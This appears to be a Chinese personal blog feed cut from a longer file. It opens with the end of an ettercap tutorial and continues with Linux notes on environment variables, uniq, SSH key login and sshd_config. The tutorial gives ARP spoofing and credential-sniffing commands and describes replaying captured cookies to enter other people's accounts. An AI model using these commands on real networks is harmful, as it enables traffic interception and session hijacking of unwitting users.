class="line">在控制台模式下（-T），对整个局域网执行ARP毒化攻击（-M arp）  </span><br><span class="line">ettercap -T -M arp // //  </span><br><span class="line">  </span><br><span class="line">在控制台模式下（-T），执行ARP双向欺骗（-M arp:remote）  </span><br><span class="line">ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2-10/  </span><br><span class="line">  </span><br><span class="line">在控制台模式下（-T），不使用ARP初始化（-z），使用安静模式（-q），监听所有主机110端口（pop3协议端口）  </span><br><span class="line">ettercap -Tzq //110  </span><br><span class="line">  </span><br><span class="line">在控制台模式下（-T），不进行ARP初始化（-z），使用安静模式（-q），监听目标10.0.0.1的21，22，23端口（FTP、SSH、TELNET）  </span><br><span class="line">ettercap -Tzq /10.0.0.1/21,22,23  </span><br><span class="line">  </span><br><span class="line">打印输出可用插件列表。  </span><br><span class="line">ettercap -P list</span><br></pre></td></tr></table></figure><h4 id="演示命令"><a href="#演示命令" class="headerlink" title="演示命令"></a>演示命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -i eth0 -Tq -M arp:remote /192.168.2.253/  /192.168.2.1/  ##双向欺骗局域网内192.168.2.253 和 192.168.2.1</span><br></pre></td></tr></table></figure><p><img src="/img/ettercap_eth.png" alt=""></p><h3 id="ARP-会话劫持"><a href="#ARP-会话劫持" class="headerlink" title="ARP 会话劫持"></a>ARP 会话劫持</h3><p>​    无论使用什么工具进行arp毒化， 我们的目的都是使目标主机的流量经过我们的网卡，即我们能使用tcpdump进行监听eth0 网卡，来捕捉网卡数据。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i  eth0 -w eth0.cap   // 进行保存捕获内容 ，使用wireshark进行显示，抓取数据</span><br></pre></td></tr></table></figure><p>打开wireshark分析捕获到的数据包分析，使用过滤语法，找出含有cookies的数据包: <code>http.cookie</code></p><p>　复制出cookies的值，并在浏览器中利用，这里推荐一款好用的cooikes利用工具cookie-injecting-tools（地址：<a href="https://github.com/lfzark/cookie-injecting-tools" target="_blank" rel="noopener">https://github.com/lfzark/cookie-injecting-tools</a>）。利用成功后，刷新页面，就可以进入到被人的主页和网盘了;</p><h3 id="Waring"><a href="#Waring" class="headerlink" title="Waring"></a>Waring</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# ettercap -i eth0 -Tq -M arp:remote /192.168.2.1/  /*/</span><br><span class="line"></span><br><span class="line">ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Incorrect number of token (///) in TARGET !!</span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -i eth0 -Tq -M arp:remote /192.168.2.253//  /192.168.2.1//</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You are very close. Compare the token /// in the error message and your token: //.</span><br><span class="line">Your version of ettercap is just IPv6 enabled. Hence the target definition gets one more part for the IPv6 address.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux 环境变量</title>
      <link href="/2018/03/27/commands/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
      <url>/2018/03/27/commands/Linux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="Shell环境变量设置"><a href="#Shell环境变量设置" class="headerlink" title="Shell环境变量设置"></a>Shell环境变量设置</h4><ul><li>set/env/export</li><li>unset   </li><li>readonly</li><li>配置文件</li><li>Shell变量</li></ul><p><br><br><a id="more"></a></p><h5 id="set-env-export"><a href="#set-env-export" class="headerlink" title="set/env/export"></a>set/env/export</h5><blockquote><p>set 显示(设置) shell变量 包括的私有变量以及用户变量， 不同类的shell有不同的私有变量， bash， ksh，zsh等私有变量是不同的。</p><p>env 显示(设置) 用户变量</p><p>export 显示(设置)当前导出用户变量的shell变量</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[oracle@zhou3 ~]$ aaa=bbb --shell变量设定     </span><br><span class="line">[oracle@zhou3 ~]$ echo $aaa      </span><br><span class="line">bbb     </span><br><span class="line">[oracle@zhou3 ~]$ env| grep aaa  --设置完当前用户变量并没有     </span><br><span class="line">[oracle@zhou3 ~]$ set| grep aaa  --shell变量有     </span><br><span class="line">aaa=bbb     </span><br><span class="line">[oracle@zhou3 ~]$ export| grep aaa --这个指的export也没导出，导出变量也没有     </span><br><span class="line">[oracle@zhou3 ~]$ export aaa   --那么用export 导出一下     </span><br><span class="line">[oracle@zhou3 ~]$ env| grep aaa  --发现用户变量内存在了     </span><br><span class="line">aaa=bbb</span><br></pre></td></tr></table></figure><h5 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h5><p>unset 命令来清除环境变量， set、env、export都可以用unset来清除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">清除环境变量的值用unset命令。如果未指定值，则该变量值将被 设为NULL。示  </span><br><span class="line">例如下：    </span><br><span class="line">$ export TEST=&quot;Test...&quot; #增加一个环境变量TEST    </span><br><span class="line">$ env|grep TEST #此命令有输入，证明环境变量TEST已经存在了    </span><br><span class="line">TEST=Test...    </span><br><span class="line">$ unset $TEST #删除环境变量TEST    </span><br><span class="line">$ env|grep TEST #此命令没有输出，证明环境变量TEST已经不存在了</span><br></pre></td></tr></table></figure><h5 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a>readonly</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用了readonly命令的话，变量就不可以被修改或清除了。示例如下：  </span><br><span class="line">$ export TEST=&quot;Test...&quot; #增加一个环境变量TEST  </span><br><span class="line">$ readonly TEST #将环境变量TEST设为只读  </span><br><span class="line">$ unset TEST #会发现此变量不能被删除  </span><br><span class="line">-bash: unset: TEST: cannot unset: readonly variable  </span><br><span class="line">$ TEST=&quot;New&quot; #会发现此也变量不能被修改  </span><br><span class="line">-bash: TEST: readonly variable</span><br></pre></td></tr></table></figure><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><ol><li><code>~/.bash_profile</code>  用户登录时被读取，其中包含的命令被执行</li><li><code>~/.bashrc</code> 启动新的shell时被读取，并执行</li><li><code>~/.bash_logout</code> shell 登录退出时被读取</li></ol><p>shell初始化过程:</p><ol><li>bash 检查文件/etc/profile 是否存在</li><li>如果存在，bash 就读取该文件，否则，跳过</li><li>bash 检查主目录下的文件.bash_profile 是否存在。</li><li>如果存在，bash 就读取該文件，否则，跳过</li><li>bash 检查主目录下的.bash_login 是否存在。</li><li>如果存在，bash 就读取该文件，否则，跳过。</li><li>bash 检查主目录下的文件.profile 是否存在</li><li>如果存在， bash 就读取该文件，否则，跳过。</li></ol><p>这些步骤都执行完后，就出现提示符了， ksh 默认提示符是 $.</p><h4 id="常见shell变量"><a href="#常见shell变量" class="headerlink" title="常见shell变量"></a>常见shell变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PATH 这个变量包含了一系列由冒号分隔开的目录，系统就从这些目录里寻找可执行文件。如果你输入的可执行文件（例如ls、rc-update或者emerge） 不在这些目录中，系统就无法执行它（除非你输入这个命令的完整路径，如/bin/ls）。  </span><br><span class="line"></span><br><span class="line">ROOTPATH 这个变量的功能和PATH相同，但它只罗列出超级用户（root）键入命令时所需检查的目录。  </span><br><span class="line"></span><br><span class="line">LDPATH 这个变量包含了一系列用冒号隔开的目录，动态链接器将在这些目录里查找库文件。 </span><br><span class="line"></span><br><span class="line">MANPATH 这个变量包含了一系列用冒号隔开的目录，命令man会在这些目录里搜索man页面。  </span><br><span class="line"></span><br><span class="line">INFODIR 这个变量包含了一系列用冒号隔开的目录，命令info将在这些目录里搜索info页面。  </span><br><span class="line"></span><br><span class="line">PAGER 这个变量包含了浏览文件内容的程序的路径（例如less或者more）。  </span><br><span class="line"></span><br><span class="line">EDITOR 这个变量包含了修改文件内容的程序（文件编辑器）的路径（比如nano或者vi）。  </span><br><span class="line"></span><br><span class="line">KDEDIRS 这个变量包含了一系列用冒号隔开的目录，里面放的是KDE相关的资料。 </span><br><span class="line"></span><br><span class="line">CONFIG_PROTECT 这个变量包含了一系列用空格隔开的目录，它们在更新的时候会被Portage保护起来。 </span><br><span class="line"></span><br><span class="line">CONFIG_PROTECT_MASK 这个变量包含了一系列用空格隔开的目录，它们在更新的时候不会被Portage保护起来。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PATH：决定了shell将到哪些目录中寻找命令或程序</span><br><span class="line">HOME：当前用户主目录</span><br><span class="line">MAIL：是指当前用户的邮件存放目录。</span><br><span class="line">SHELL：是指当前用户用的是哪种Shell。</span><br><span class="line">HISTSIZE：是指保存历史命令记录的条数</span><br><span class="line">LOGNAME：是指当前用户的登录名。 </span><br><span class="line">HOSTNAME：是指主机的名称，许多应用程序如果要用到主机名的话，通常是从这个环境变量中来取得的。</span><br><span class="line">LANG/LANGUGE：是和语言相关的环境变量，使用多种语言的用户可以修改此环境变量。 </span><br><span class="line">PS1：是基本提示符，对于root用户是#，对于普通用户是$。</span><br><span class="line">PS2：是附属提示符，默认是“&gt;”。可以通过修改此环境变量来修改当前的命令符，比如下列命令会将提示符修改成字符串“Hello,My NewPrompt :) ”。 </span><br><span class="line"># PS1=&quot; Hello,My NewPrompt :) &quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux uniq</title>
      <link href="/2018/03/20/commands/Linux-uniq/"/>
      <url>/2018/03/20/commands/Linux-uniq/</url>
      
        <content type="html"><![CDATA[<h3 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h3><p><code>uniq</code> 在读取行时会对它们进行比较并将只除去两个或更多的<strong>连续行</strong></p><a id="more"></a><p><br></p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-c, --count           prefix lines by the number of occurrences</span><br><span class="line">-d, --repeated        only print duplicate lines, one for each group</span><br><span class="line">-D                    print all duplicate lines</span><br><span class="line">    --all-repeated[=METHOD]  like -D, but allow separating groups</span><br><span class="line">                               with an empty line;</span><br><span class="line">                               METHOD=&#123;none(default),prepend,separate&#125;</span><br><span class="line">-f, --skip-fields=N   avoid comparing the first N fields</span><br><span class="line">    --group[=METHOD]  show all items, separating groups with an empty line;</span><br><span class="line">                        METHOD=&#123;separate(default),prepend,append,both&#125;</span><br><span class="line">-i, --ignore-case     ignore differences in case when comparing</span><br><span class="line">-s, --skip-chars=N    avoid comparing the first N characters</span><br><span class="line">-u, --unique          only print unique lines</span><br><span class="line">-z, --zero-terminated     line delimiter is NUL, not newline</span><br><span class="line">-w, --check-chars=N   compare no more than N characters in lines</span><br><span class="line">    --help     display this help and exit</span><br><span class="line">    --version  output version information and exit</span><br></pre></td></tr></table></figure><p>最为常用的即为: <code>-c</code>    <code>-u</code>    <code>-d</code></p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# cat uniqfile </span><br><span class="line">12334</span><br><span class="line">12334</span><br><span class="line">1234567</span><br><span class="line">Hello,world</span><br><span class="line">1234567</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><h5 id="Uniq-使用去除连续重复行"><a href="#Uniq-使用去除连续重复行" class="headerlink" title="Uniq 使用去除连续重复行"></a>Uniq 使用去除连续重复行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# uniq uniqfile </span><br><span class="line">12334</span><br><span class="line">1234567</span><br><span class="line">Hello,world</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><h5 id="c-参数-显示连续个数"><a href="#c-参数-显示连续个数" class="headerlink" title="-c 参数 显示连续个数"></a>-c 参数 显示连续个数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# uniq -c uniqfile </span><br><span class="line">      2 12334</span><br><span class="line">      1 1234567</span><br><span class="line">      1 Hello,world</span><br><span class="line">      2 1234567</span><br></pre></td></tr></table></figure><h5 id="d-参数-显示重复行"><a href="#d-参数-显示重复行" class="headerlink" title="-d 参数  显示重复行"></a>-d 参数  显示重复行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# uniq -d uniqfile </span><br><span class="line">12334</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><h5 id="u-参数-显示唯一"><a href="#u-参数-显示唯一" class="headerlink" title="-u 参数 显示唯一"></a>-u 参数 显示唯一</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# uniq -u uniqfile </span><br><span class="line">1234567                 ## 实际还是重复，但是不连续，因此需要配合sort</span><br><span class="line">Hello,world</span><br></pre></td></tr></table></figure><h5 id="配合-sort-去除所有重复行"><a href="#配合-sort-去除所有重复行" class="headerlink" title="配合 sort 去除所有重复行"></a>配合 sort 去除所有重复行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# sort uniqfile </span><br><span class="line">12334</span><br><span class="line">12334</span><br><span class="line">1234567</span><br><span class="line">1234567</span><br><span class="line">1234567</span><br><span class="line">Hello,world</span><br><span class="line"></span><br><span class="line">root@Kali:~# sort uniqfile | uniq -c   ## 存在个数</span><br><span class="line">      2 12334</span><br><span class="line">      3 1234567</span><br><span class="line">      1 Hello,world</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@Kali:~# sort uniqfile | uniq -u</span><br><span class="line">Hello,world         ## 唯一</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@Kali:~# sort uniqfile | uniq -d    ##输出重复</span><br><span class="line">12334</span><br><span class="line">1234567</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@Kali:~# sort uniqfile |uniq   ## 即可进行重定向输出</span><br><span class="line">12334</span><br><span class="line">1234567</span><br><span class="line">Hello,world</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSH 公钥登陆服务器</title>
      <link href="/2018/03/13/commands/SSH-%E5%85%AC%E9%92%A5%E7%99%BB%E9%99%86%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2018/03/13/commands/SSH-%E5%85%AC%E9%92%A5%E7%99%BB%E9%99%86%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>​    密钥形式登录的原理是:</p><p>​        利用密钥生成器制作一对密钥——一只公钥和一只私钥。将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。这样一来，没有私钥，任何人都无法通过 SSH 暴力破解你的密码来远程登录到系统。</p><a id="more"></a><p><br></p><h4 id="公钥私钥生成"><a href="#公钥私钥生成" class="headerlink" title="公钥私钥生成"></a>公钥私钥生成</h4><p><code>ssh-keygen</code>命令专门是用来生成密钥的。该命令有很多选项，这里列出了最基本的四个：</p><ul><li><code>-t</code> 用来指定密钥类型（<code>dsa | ecdsa | ed25519 | rsa | rsa1</code>）;</li><li><code>-P</code> 用来指定密语</li><li><code>-f</code> 用来指定生成的密钥文件名</li><li><code>-C</code> 用来添加注释</li><li><code>-b</code> 指定长度</li></ul><p><code>ssh-keygen -t rsa -P 123456 -f host -b 4096 -C &#39;my host key&#39;</code>意思就是新建了密语为<code>123456</code>注释为<code>my host key</code>文件名为<code>host</code>的密钥。此命令会生成<code>host</code>和<code>host.pub</code>两个文件，前者为<code>私钥文件</code>，后者为<code>公钥文件</code>。如果你想免密登录的话，请将密语设置为空。</p><h5 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Postgres@sucro109:~/.ssh$ ls</span><br><span class="line">known_hosts</span><br><span class="line">Postgres@sucro109:~/.ssh$ ssh-keygen </span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/home/Postgres/.ssh/id_rsa):   ## 指定文件名称</span><br><span class="line">Enter passphrase (empty for no passphrase): ## 填写保护密码, 直接回车,即可实现无密码登陆</span><br><span class="line">Enter same passphrase again:    ## 再次确认</span><br><span class="line">Your identification has been saved in /home/Postgres/.ssh/id_rsa.   ## 秘钥</span><br><span class="line">Your public key has been saved in /home/Postgres/.ssh/id_rsa.pub.   ## 公钥</span><br><span class="line">The key fingerprint is:</span><br><span class="line">88:2b:e7:45:51:1b:0a:b1:b7:39:64:18:69:23:99:44 Postgres@sucro109</span><br><span class="line">The key&apos;s randomart image is:</span><br><span class="line">+--[ RSA 2048]----+</span><br><span class="line">| oEo+o  o        |</span><br><span class="line">|  + += o o       |</span><br><span class="line">|   oo.* .        |</span><br><span class="line">|     = =         |</span><br><span class="line">|    . * S        |</span><br><span class="line">|     o .         |</span><br><span class="line">|  . o .          |</span><br><span class="line">|   + .           |</span><br><span class="line">|    .            |</span><br><span class="line">+-----------------+</span><br><span class="line">Postgres@sucro109:~/.ssh$ </span><br><span class="line">Postgres@sucro109:~/.ssh$ ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br></pre></td></tr></table></figure><h4 id="将公钥上传服务器"><a href="#将公钥上传服务器" class="headerlink" title="将公钥上传服务器"></a>将公钥上传服务器</h4><p>上传方式:</p><ol><li><p><code>ssh-copy-id</code></p><p><code>ssh-copy-id [-i [identity_file]] [user@]machine</code></p><p><code>-i</code> 指定公钥文件</p></li><li><p><code>scp</code></p><p>​</p></li><li><p><code>rsync</code></p></li></ol><p>将其公钥存放至 <code>~/.ssh/authorized_keys</code>中 ; 如果文件名不想使用可以通过 <code>AuthorizedKeysFile  .ssh/authorized_keys</code> 来重新指定文件名</p><ul><li>再次上传其他主机公钥时， 追加到该文件即可.</li></ul><h4 id="设置SSH，打开秘钥登陆"><a href="#设置SSH，打开秘钥登陆" class="headerlink" title="设置SSH，打开秘钥登陆"></a>设置SSH，打开秘钥登陆</h4><p><code>vi /etc/ssh/sshd_config</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes      ## #是否允许使用纯 RSA 公钥认证。</span><br><span class="line">PubkeyAuthentication yes   ## 是否允许公钥认证。仅可以用于SSH-2。</span><br><span class="line">AuthorizedKeysFile  .ssh/authorized_keys  ## 公钥文件</span><br></pre></td></tr></table></figure><p>注意root用户是否登陆：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure><p>禁止密码登陆:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no  ##  是否允许使用基于密码的认证。</span><br></pre></td></tr></table></figure><p>重启服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><h4 id="客户端链接"><a href="#客户端链接" class="headerlink" title="客户端链接"></a>客户端链接</h4><p>​    本人是通过<code>ssh</code>命令来远程连接服务器的，通过<code>ssh -p your_port username@domain -i your_private_certification</code>命令，就可以连接到服务器了。如果你是通过<code>xshell</code>或者<code>putty</code>来连接的话，导入你的私钥并连接就可以了。</p><p><strong>异常</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> 4 -rw-r--r--  1 root root       3311 Apr 19 05:27 id_rsa_4096_45.78.55.192_private</span><br><span class="line"></span><br><span class="line">root@Kali:~# ssh  -i ./id_rsa_4096_45.78.55.192_private -p 28392 root@45.78.55.192</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0644 for &apos;./id_rsa_4096_45.78.55.192_private&apos; are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br><span class="line">Load key &quot;./id_rsa_4096_45.78.55.192_private&quot;: bad permissions</span><br><span class="line">root@45.78.55.192: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</span><br></pre></td></tr></table></figure></p><p><strong>解决办法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa_4096_45.78.55.192_private </span><br><span class="line">root@Kali:~# ssh  -i id_rsa_4096_45.78.55.192_private -p 28392 root@45.78.55.192</span><br><span class="line">Enter passphrase for key &apos;id_rsa_4096_45.78.55.192_private&apos;:</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SSH </category>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSH_config_file</title>
      <link href="/2018/03/12/commands/SSH-config-file/"/>
      <url>/2018/03/12/commands/SSH-config-file/</url>
      
        <content type="html"><![CDATA[<p>SSH 配置文件解析</p><a id="more"></a><p><br></p><h3 id="sshd-config"><a href="#sshd-config" class="headerlink" title="sshd_config"></a>sshd_config</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>$OpenBSD: sshd_config,v 1.93 2014/01/10 05:59:19 djm Exp $</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> This is the sshd server system-wide configuration file.  See</span><br><span class="line"><span class="meta">#</span> sshd_config(5) for more information.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> This sshd was compiled with PATH=/usr/local/bin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> The strategy used for options in the default sshd_config shipped with</span><br><span class="line"><span class="meta">#</span> OpenSSH is to specify options with their default value where</span><br><span class="line"><span class="meta">#</span> possible, but leave them commented.  Uncommented options override the</span><br><span class="line"><span class="meta">#</span> default value.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> If you want to change the port on a SELinux system, you have to tell</span><br><span class="line"><span class="meta">#</span> SELinux about this change.</span><br><span class="line"><span class="meta">#</span> semanage port -a -t ssh_port_t -p tcp #PORTNUMBER</span><br><span class="line"><span class="meta">#</span></span><br><span class="line">Port 22  #设置ssh监听的端口号，默认22端口</span><br><span class="line">ListenAddress ::</span><br><span class="line">ListenAddress 0.0.0.0  #指定监听的地址，默认监听所有；</span><br><span 